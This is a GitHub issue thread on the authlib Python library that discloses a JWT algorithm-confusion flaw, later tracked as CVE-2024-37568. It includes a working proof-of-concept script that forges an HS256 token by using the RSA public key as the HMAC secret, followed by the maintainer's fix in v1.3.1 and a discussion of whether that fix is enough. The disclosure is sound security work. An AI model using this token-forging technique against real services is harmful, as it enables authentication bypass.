
[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Flepture%2Fauthlib%2Fissues%2F654)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Flepture%2Fauthlib%2Fissues%2F654)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fissues_fragments%2Fissue_layout&source=header-repo&source_repo=lepture%2Fauthlib)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[lepture](/lepture)
/
**[authlib](/lepture/authlib)**
Public

* [Notifications](/login?return_to=%2Flepture%2Fauthlib) You must be signed in to change notification settings
* [Fork
  469](/login?return_to=%2Flepture%2Fauthlib)
* [Star
   4.6k](/login?return_to=%2Flepture%2Fauthlib)

* [Code](/lepture/authlib)
* [Issues
  91](/lepture/authlib/issues)
* [Pull requests
  11](/lepture/authlib/pulls)
* [Discussions](/lepture/authlib/discussions)
* [Actions](/lepture/authlib/actions)
* [Projects
  0](/lepture/authlib/projects)
* [Security](/lepture/authlib/security)
* [Insights](/lepture/authlib/pulse)

Additional navigation options

* [Code](/lepture/authlib)
* [Issues](/lepture/authlib/issues)
* [Pull requests](/lepture/authlib/pulls)
* [Discussions](/lepture/authlib/discussions)
* [Actions](/lepture/authlib/actions)
* [Projects](/lepture/authlib/projects)
* [Security](/lepture/authlib/security)
* [Insights](/lepture/authlib/pulse)

New issue

**Have a question about this project?** Sign up for a free GitHub account to open an issue and contact its maintainers and the community.

 [Sign up for GitHub](/signup?return_to=%2Flepture%2Fauthlib%2Fissues%2Fnew%2Fchoose)

By clicking ‚ÄúSign up for GitHub‚Äù, you agree to our [terms of service](https://docs.github.com/terms) and
[privacy statement](https://docs.github.com/privacy). We‚Äôll occasionally send you account related emails.

Already on GitHub?
[Sign in](/login?return_to=%2Flepture%2Fauthlib%2Fissues%2Fnew%2Fchoose)
to your account

[Jump to bottom](#issue-comment-box)

# Algorithm confusion when verifying JSON Web Tokens with asymmetric public keys #654

Closed

[milliesolem](/milliesolem) opened this issue
Jun 3, 2024
¬∑ 5 comments

Closed

# [Algorithm confusion when verifying JSON Web Tokens with asymmetric public keys](#top) #654

[milliesolem](/milliesolem) opened this issue
Jun 3, 2024
¬∑ 5 comments

Assignees
[![@lepture](https://avatars.githubusercontent.com/u/290496?s=40&v=4)](/lepture)

Labels
[bug](/lepture/authlib/labels/bug)

## Comments

[![@milliesolem](https://avatars.githubusercontent.com/u/61805186?s=80&u=a4cd1705ed916c406645907f7a956a64aac6ea08&v=4)](/milliesolem)

Copy link

### **[milliesolem](/milliesolem)** commented [Jun 3, 2024](#issue-2331218331)

| Issue description If the `algorithm` field is left unspecified when calling `jwt.decode`, the library will allow HMAC verification with ANY asymmetric public key. The library does no checks whatsoever to mitigate this. This applies to verification with the algorithms HS256, HS384, and HS512 in lieu of the asymmetric algorithm. This issue is also persistent in [joserfc](https://github.com/authlib/joserfc). This vulnerability is similar to [CVE-2022-29217](https://github.com/advisories/GHSA-ffqj-6fqr-9h24 "CVE-2022-29217") and [CVE-2024-33663](https://github.com/advisories/GHSA-6c5p-j8vq-pqhj "CVE-2024-33663"), however severity is higher as this applies to ALL verification with asymmetric public keys, regardless of format.  The [Authlib documentation on JWTs](https://docs.authlib.org/en/latest/jose/jwt.html) starts off with a code snippet demonstrating JWT signing and verfication of claims using RSA. The code snippet shown is vulnerable to this issue. The documetation does halfway down the page go on to describe the danger of not checking the algorithm header, however does not adequately press the importance of not doing so, nor does the library implement adequate protections against this. Proposed solution Same solution as for the patch for [CVE-2022-29217](https://github.com/advisories/GHSA-ffqj-6fqr-9h24 "CVE-2022-29217") and [CVE-2024-33663](https://github.com/advisories/GHSA-6c5p-j8vq-pqhj "CVE-2024-33663"). A thorough, comprehensive check of whether the verifying key is asymmetric, see [here](https://github.com/jpadilla/pyjwt/blob/7b4bc844b9d4c38a8dbba1e727f963611124dd5b/jwt/utils.py#L100). When performing signature verification with HMAC, first check whether the verifying key is not actually a PEM or SSH-encoded asymmetric public key; this is a clear sign of algorithm confusion.  Also make non-usage of the algorithms keyword throw an exception when using the `jwt.decode` method, or at the very least a warning, so that the developer at least knows they are doing something silly by not using it. Alternatively, depricate the method an instead only allow usage of the `JsonWebToken` class, with algorithm as a mandatory parameter and disallow usage of multiple algorithms in a single instance. Proof-of-Concept Here is a simplified Proof-of-Concept using pycryptodome for key generation that illustrates one way this could be exploited  ``` from authlib.jose import jwt from Crypto.PublicKey import RSA from Crypto.Hash import HMAC, SHA256 import base64  # ----- SETUP -----  # generate an asymmetric RSA keypair # !! signing should only be possible with the private key !! KEY = RSA.generate(2048)  # PUBLIC KEY, AVAILABLE TO USER # CAN BE RECOVERED THROUGH E.G. PUBKEY RECOVERY WITH TWO SIGNATURES: # https://crypto.stackexchange.com/questions/26188/rsa-public-key-recovery-from-signatures # https://github.com/FlorianPicca/JWT-Key-Recovery PUBKEY = KEY.public_key().export_key(format='PEM')  # Sanity check PRIVKEY = KEY.export_key(format='PEM') token = jwt.encode({"alg": "RS256"}, {"pwned":False}, PRIVKEY) claims = jwt.decode(token, PUBKEY) assert not claims["pwned"]  # ---- CLIENT SIDE -----  # without knowing the private key, a valid token can be constructed # YIKES!!  b64 = lambda x:base64.urlsafe_b64encode(x).replace(b'=',b'') payload = b64(b'{"alg":"HS256"}') + b'.' + b64(b'{"pwned":true}') hasher = HMAC.new(PUBKEY, digestmod=SHA256) hasher.update(payload) evil_token = payload + b'.' + b64(hasher.digest()) print("üòà",evil_token)  # ---- SERVER SIDE -----  # verify and decode the token using the public key, as is custom # algorithm field is left unspecified # but the library will happily still verify without warning, trusting the user-controlled alg field of the token header data = jwt.decode(evil_token, PUBKEY) if data["pwned"]:     print("VULNERABLE") ``` Disclaimer As per the security policy, I contacted both the author and Tidelift about this issue in early April of this year. I received a response from Tidelift that they would follow up the issue, however the issue remains unpatched and I have still not heard further from either. As such, I am opening a public issue on this vulnerability. |
| --- |
| The text was updated successfully, but these errors were encountered: |

All reactions

[![@milliesolem](https://avatars.githubusercontent.com/u/61805186?s=40&u=a4cd1705ed916c406645907f7a956a64aac6ea08&v=4)](/milliesolem)
[milliesolem](/milliesolem)
added
the
[bug](/lepture/authlib/labels/bug)
label
[Jun 3, 2024](#event-13021632325)

[![@milliesolem](https://avatars.githubusercontent.com/u/61805186?s=40&u=a4cd1705ed916c406645907f7a956a64aac6ea08&v=4)](/milliesolem)
[milliesolem](/milliesolem)
assigned [lepture](/lepture)
[Jun 3, 2024](#event-13021632363)

[lepture](/lepture)
added a commit
that referenced
this issue
[Jun 4, 2024](#ref-commit-3bea812)
[![@lepture](https://avatars.githubusercontent.com/u/290496?s=40&v=4)](/lepture)

`[fix: prevent OctKey to import ssh/rsa/pem keys](/lepture/authlib/commit/3bea812acefebc9ee108aa24557be3ba8971daf1 "fix: prevent OctKey to import ssh/rsa/pem keys

https://github.com/lepture/authlib/issues/654")`
‚Ä¶

`[3bea812](/lepture/authlib/commit/3bea812acefebc9ee108aa24557be3ba8971daf1)`

```
[#654](https://github.com/lepture/authlib/issues/654)
```

[![@lepture](https://avatars.githubusercontent.com/u/290496?s=80&v=4)](/lepture)

Copy link

Owner

### **[lepture](/lepture)** commented [Jun 4, 2024](#issuecomment-2146942997)

| Released v1.3.1 |
| --- |

All reactions

Sorry, something went wrong.

[![@stigtsp](https://avatars.githubusercontent.com/u/75371?s=40&u=07f2c9eaa4df07b236648c9ccd97a951735fb8d2&v=4)](/stigtsp)
[stigtsp](/stigtsp)
mentioned this issue
[Jun 9, 2024](#ref-pullrequest-2342462801)

[pythonPackages.authlib: 1.3.0 -> 1.3.1
NixOS/nixpkgs#318615](/NixOS/nixpkgs/pull/318615)
 Closed

13 tasks

[![@milliesolem](https://avatars.githubusercontent.com/u/61805186?s=80&u=a4cd1705ed916c406645907f7a956a64aac6ea08&v=4)](/milliesolem)

Copy link

Author

### **[milliesolem](/milliesolem)** commented [Jun 9, 2024](#issuecomment-2156815692)

| This vulnerability is now tracked under [CVE-2024-37568](https://github.com/advisories/GHSA-5357-c2jx-v7qh "CVE-2024-37568").  After testing, the patch provided in 1.3.1 *seems* adequate for any imminent exploitation of the vulnerability. However, for future releases, I would recommend the following:   1. Also make the algorithms field mandatory when decoding, or at the very least throw a warning when not used. The current patch resisted initial security testing by me, but there may be key formats not accounted for. Solving the root cause of this issue would be preferable. 2. Improve the error message when doing HMAC verification with a public key to more explicitly say what the problem is. I don't think the message "This key may not be safe to import" is adequately intuitive to help developer understand if their usage of the library is secure or not. A message such as "Asymmetric key formats may not be used with HMAC verification" would be much better.   Closing issue in faith that the above gets addressed in time. [@lepture](https://github.com/lepture) |
| --- |

All reactions

Sorry, something went wrong.

[![@milliesolem](https://avatars.githubusercontent.com/u/61805186?s=40&u=a4cd1705ed916c406645907f7a956a64aac6ea08&v=4)](/milliesolem)
[milliesolem](/milliesolem)
closed this as [completed](/lepture/authlib/issues?q=is%3Aissue+is%3Aclosed+archived%3Afalse+reason%3Acompleted)
[Jun 9, 2024](#event-13092735231)

[![@stigtsp](https://avatars.githubusercontent.com/u/75371?s=80&u=07f2c9eaa4df07b236648c9ccd97a951735fb8d2&v=4)](/stigtsp)

Copy link

### **[stigtsp](/stigtsp)** commented [Jun 10, 2024](#issuecomment-2158016159)

| [@milliesolem](https://github.com/milliesolem) Does this mean that [CVE-2024-37568](https://github.com/advisories/GHSA-5357-c2jx-v7qh "CVE-2024-37568") is not fixed by v1.3.1? |
| --- |

All reactions

Sorry, something went wrong.

[![@milliesolem](https://avatars.githubusercontent.com/u/61805186?s=80&u=a4cd1705ed916c406645907f7a956a64aac6ea08&v=4)](/milliesolem)

Copy link

Author

### **[milliesolem](/milliesolem)** commented [Jun 10, 2024](#issuecomment-2158165228)

| [@stigtsp](https://github.com/stigtsp) It *seems* fixed, the patch basically introduces a blocklist of public key formats when verifying with HMAC. I was not able to bypass this blocklist. But the patch could be much improved by requiring the developer to specify which algorithm is to be used (see patch for [CVE-2022-29217](https://github.com/advisories/GHSA-ffqj-6fqr-9h24 "CVE-2022-29217")). That way we would know for sure, rather than hoping the blocklist is comprehensive. |
| --- |

 üëç
1
 stigtsp reacted with thumbs up emoji

All reactions

* üëç
  1 reaction

Sorry, something went wrong.

[![@lepture](https://avatars.githubusercontent.com/u/290496?s=80&v=4)](/lepture)

Copy link

Owner

### **[lepture](/lepture)** commented [Jun 10, 2024](#issuecomment-2158842298)

| [@stigtsp](https://github.com/stigtsp) [@milliesolem](https://github.com/milliesolem) it is a little hard to keep the compatibility while improve the security. I've changed the behavior in `joserfc`, you should not pass a string or bytes as the key now.  <https://jose.authlib.org/en/> <https://github.com/authlib/joserfc/blob/main/src/joserfc/jwk.py#L81> |
| --- |

All reactions

Sorry, something went wrong.

[![@SCH227](https://avatars.githubusercontent.com/u/69127692?s=40&v=4)](/SCH227)
[SCH227](/SCH227)
mentioned this issue
[Oct 16, 2024](#ref-issue-2592681138)

[Information regarding Algorithm Confusion Vulnerability
authlib/joserfc#27](/authlib/joserfc/issues/27)

Closed

[Sign up for free](/join?source=comment-repo)
**to join this conversation on GitHub**.
Already have an account?
[Sign in to comment](/login?return_to=https%3A%2F%2Fgithub.com%2Flepture%2Fauthlib%2Fissues%2F654)

Assignees

[![@lepture](https://avatars.githubusercontent.com/u/290496?s=40&v=4)](/lepture) [lepture](/lepture)

Labels

[bug](/lepture/authlib/labels/bug)

Projects

None yet

Milestone

No milestone

Development

No branches or pull requests

3 participants

[![@stigtsp](https://avatars.githubusercontent.com/u/75371?s=52&v=4)](/stigtsp) [![@lepture](https://avatars.githubusercontent.com/u/290496?s=52&v=4)](/lepture) [![@milliesolem](https://avatars.githubusercontent.com/u/61805186?s=52&v=4)](/milliesolem)

## Footer

¬© 2025 GitHub,¬†Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can‚Äôt perform that action at this time.

